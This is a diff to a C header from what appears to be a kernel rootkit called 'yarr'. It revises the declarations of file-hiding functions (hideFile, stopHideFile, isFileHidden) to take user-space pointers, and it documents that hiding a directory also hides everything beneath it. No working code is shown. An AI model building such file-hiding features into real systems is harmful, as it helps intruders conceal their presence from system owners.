@@ -36,26 +36,30 @@ void exit_hidefile(void);
 /***
  * Hides the specified file.
  *
- * @name: The path to the file.
+ * @filename: The filename of the file to hide.
  * @return: Zero on success or -1 if there were errors.
  */
-int hideFile(const char *name);
+int hideFile(const char __user *filename);
 
 /***
  * Stops hidding the specified file.
  *
- * @name: The path to the file.
+ * @filename: The filename of the file to stop hidding.
  * @return: Zero on success or -1 if there were errors.
  */
-int stopHideFile(const char *name);
+int stopHideFile(const char __user *filename);
 
 /***
- * Tells whether a file is being (should be) hide or not.
+ * Tells whether a file is being (should be) hide or not. A file is hidden if
+ * yarr has been asked to hide it or any one of his fathers. For example if
+ * yarr is requested to hide /path/dir (a directory) and then someone try to
+ * access /path/dir/file (suppose it exists) it will be hidden because its
+ * ascendant /path/dir is hidden.
  *
- * @name: The path of the file to check for.
+ * @filename: The filename of the file to check for.
  * @return: Zero if the file is not being hidden or non-zero elsewhere.
  */
-int isFileHidden(const char *name);
+int isFileHidden(const char __user *filename);
 
 #endif /* __YARR_NINJA_FILES. */
 
